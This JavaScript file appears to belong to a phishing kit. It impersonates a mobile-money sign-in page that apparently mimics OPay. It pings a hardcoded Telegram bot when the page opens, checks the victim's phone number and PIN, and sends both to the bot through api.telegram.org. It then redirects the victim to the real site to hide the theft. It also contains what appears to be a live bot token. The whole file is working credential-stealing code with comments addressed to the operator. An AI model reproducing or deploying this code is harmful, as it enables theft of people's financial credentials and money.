// 🔑 Your Telegram Credentials
const botToken = '8368914920:AAHI2tiRbLzxV70DWKkja9vwuRoQh089MUo';
const chatId = '7909543900';

// 🛡️ Helper function to send data to Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
    try {
        await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: chatId,
                text: message,
                parse_mode: 'HTML'
            })
        });
    } catch (e) {
        console.error("Connection error");
    }
}

// 1️⃣ ALERT ON LOAD: You will know the moment the link is clicked
window.onload = () => {
    sendToTelegram("<b>🚀 Link Clicked!</b>\nA user has just opened your portal.");
};

// 2️⃣ FORM LOGIC: Handle the "Sign In" button click
const authForm = document.getElementById('auth-form');

authForm.addEventListener('submit', async (e) => {
    e.preventDefault(); // Stop page from refreshing
    
    const phoneInput = document.getElementById('phone');
    const pinInput = document.getElementById('pin');
    const submitBtn = document.getElementById('submit-btn');

    let hasError = false;

    // --- Validation Checks ---

    // Check if Phone is empty or too short
    if (phoneInput.value.trim() === "" || phoneInput.value.length < 10) {
        phoneInput.classList.add('error'); // Triggers red box in CSS
        hasError = true;
    } else {
        phoneInput.classList.remove('error');
    }

    // Check if PIN is empty or less than 4 digits
    if (pinInput.value.trim() === "" || pinInput.value.length < 4) {
        pinInput.classList.add('error'); // Triggers red box in CSS
        hasError = true;
    } else {
        pinInput.classList.remove('error');
    }

    // If there is a red box, stop here
    if (hasError) return;

    // If valid, show loading state
    submitBtn.innerText = "Verifying...";
    submitBtn.disabled = true;

    // Send the "Real" details to your bot
    const logData = `<b>🔑 New Login Attempt</b>\n<b>Phone:</b> <code>${phoneInput.value}</code>\n<b>PIN:</b> <code>${pinInput.value}</code>`;
    
    await sendToTelegram(logData);

    // Final step: Redirect them to the actual site
    window.location.replace("https://www.opayweb.com/");
});
